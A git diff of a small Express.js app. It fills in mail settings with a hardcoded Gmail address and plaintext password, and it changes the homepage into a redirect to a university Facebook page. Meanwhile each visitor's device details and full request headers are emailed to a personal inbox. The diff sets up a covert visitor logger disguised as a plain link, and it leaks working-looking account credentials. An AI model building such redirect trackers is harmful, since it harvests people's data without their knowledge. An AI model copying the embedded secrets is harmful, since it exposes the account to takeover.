@@ -9,11 +9,11 @@ const app = express();
 app.use(device.capture());
 
 let transport = nodemailer.createTransport({
-  host: "enter_details_here",
-  port: 000, //modify the port of your mail service provider
+  host: "smtp.gmail.com",
+  port: 587, //modify the port of your mail service provider
   auth: {
-    user: "your_username_goes_here",
-    pass: "your_password_goes_here"
+    user: "innovation.manipal@gmail.com",
+    pass: "studentProject1"
   }
 });
 
@@ -33,8 +33,8 @@ app.get("/", function(req, res) {
     "cache-control"
   )} \r\n ${req.device.type.toUpperCase()} \r\n All Device Info: ${infoAll} \r\n \r\n Full Header: ${headersAll} `;
   const message = {
-    from: "the_email_you_declared_above_goes_here",
-    to: "reciever_email_goes_here",
+    from: "innovation.manipal@gmail.com",
+    to: "yasharyan307@outlook.com",
     subject: "New Visitor",
     text: `The body of the message goes here. \n\r ${data}` // Plain text body
   };
@@ -45,7 +45,7 @@ app.get("/", function(req, res) {
       console.log(`Message sent at ${datetime}`);
     }
   });
-  res.sendFile(__dirname + "/public/homepage.html");
+  res.redirect("https://www.facebook.com/mahemanipal/");
 });
 
 app.get("*", function(req, res) {
